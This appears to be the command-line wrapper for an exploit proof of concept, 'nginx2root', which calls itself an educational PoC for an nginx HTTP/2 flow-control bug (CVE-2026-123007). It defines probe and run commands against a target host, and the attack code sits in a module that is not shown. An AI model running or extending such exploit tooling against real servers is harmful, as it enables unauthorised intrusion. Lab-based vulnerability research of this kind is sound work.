"""nginx2root PoC CLI.

Examples:
    ./n2r probe --host target
    ./n2r run   --host target
    ./n2r run   --host target --accelerate
"""

from __future__ import annotations

import argparse
import sys

from . import banner, attack, ui


def build_parser() -> argparse.ArgumentParser:
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--no-banner", action="store_true",
                        default=argparse.SUPPRESS,
                        help="do not print the ASCII banner")

    parser = argparse.ArgumentParser(
        prog="n2r",
        description="Educational PoC for CVE-2026-123007 (nginx HTTP/2 "
                    "flow-control underflow).",
        parents=[common],
    )

    sub = parser.add_subparsers(dest="command", required=True)

    for name, help_text in (
        ("probe", "fingerprint only: server banner and ALPN h2"),
        ("run", "run the full chain of stages"),
    ):
        p = sub.add_parser(name, help=help_text, parents=[common])
        p.add_argument("--host", required=True, help="target host")
        p.add_argument("--port", type=int, default=8443,
                       help="TLS port with HTTP/2 (default: 8443)")
        if name == "run":
            p.add_argument(
                "--accelerate", action="store_true",
                help="trigger the lab accelerator hook in the last "
                     "stage (required to see the SIGSEGV)",
            )

    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)

    if not getattr(args, "no_banner", False):
        banner.render()
        print(ui.grey("Do not point this at systems you do not own"))
        print()

    try:
        if args.command == "probe":
            attack.probe(args.host, args.port)
            return 0

        return attack.run(args.host, args.port, accelerate=args.accelerate)
    except (OSError, TimeoutError) as exc:
        print()
        ui.bad(f"network failure: {exc}")
        ui.note("is the target up? run ./scripts/up.sh")
        return 3


if __name__ == "__main__":
    sys.exit(main())
